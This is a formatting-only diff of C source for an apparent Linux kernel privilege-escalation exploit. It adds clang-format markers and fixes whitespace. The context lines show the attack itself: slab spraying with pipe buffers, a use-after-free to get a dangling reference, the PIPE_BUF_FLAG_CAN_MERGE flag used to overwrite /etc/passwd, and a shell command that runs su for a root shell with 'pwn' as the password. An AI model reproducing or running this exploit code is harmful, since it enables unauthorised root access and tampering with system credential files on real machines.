@@ -99,11 +99,14 @@ int act(int act_fd, int code, int n, char *args)
  * Use the slab cache with objects of size (N * sizeof(struct pipe_buffer)),
  * which is (N * 40) bytes.
  */
+
+/* clang-format off */
 #define N		2
 #define PIPES_N		OBJS_PER_SLAB * 8
 int pipe_fds[PIPES_N][2];
 
 #define PIPE_BUF_FLAG_CAN_MERGE	0x10
+/* clang-format on */
 
 int passwd_fd = 0;
 
@@ -233,8 +236,7 @@ int main(void)
 	ssize_t bytes = 0;
 	size_t pwd_len = strlen(pwd);
 	char *argv[] = {
-		"/bin/sh",
-		"-c",
+		"/bin/sh", "-c",
 		"(echo pwn; cat) | su -l -c \"id; cp -v /tmp/passwd.bkp /etc/passwd; id; /bin/sh\"",
 		NULL
 	};
@@ -287,7 +289,7 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
 	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
+	uaf_n = current_n - 1;
 	printf("[+] done, uaf_n: %ld\n", uaf_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
@@ -375,7 +377,6 @@ int main(void)
 			perror("[-] write short");
 			goto end;
 		}
-
 	}
 	printf("[+] wrote to pipes\n");
 
